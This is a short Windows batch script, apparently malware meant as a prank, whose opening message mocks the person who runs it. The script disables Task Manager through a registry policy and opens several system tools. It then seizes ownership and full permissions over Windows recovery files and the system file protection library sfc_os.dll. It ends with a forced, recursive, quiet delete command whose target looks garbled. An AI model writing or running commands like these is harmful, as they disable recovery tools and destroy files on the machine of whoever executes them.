@echo "Why the fuck would you open this you absolute buffoon your pc will not be happy with you AT ALL. Also dont even try to task manager your way out of this because i have disabled it :)"
pause
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
start msedge.exe
start Control Panel
start explorer.exe
start powershell.exe
start cmd
@echo off 
takeown /f C:\Windows\SysWOW64\Recovery /r /d y
icacls C:\Windows\SysWOW64\Recovery /grant administrators:F /t 
takeown /f C:\Windows\System32\Recovery\ReAgent.xml /r /d y 
icacls C:\Windows\System32\Recovery\ReAgent.xml /grant administrators:F /t
takeown /f "C:\Windows\SysWOW64\sfc_os.dll" /r /d y 
icacls C:\Windows\SysWOW64\sfc_os.dll /grant administrators:F /t 
del /F /S /Q ','
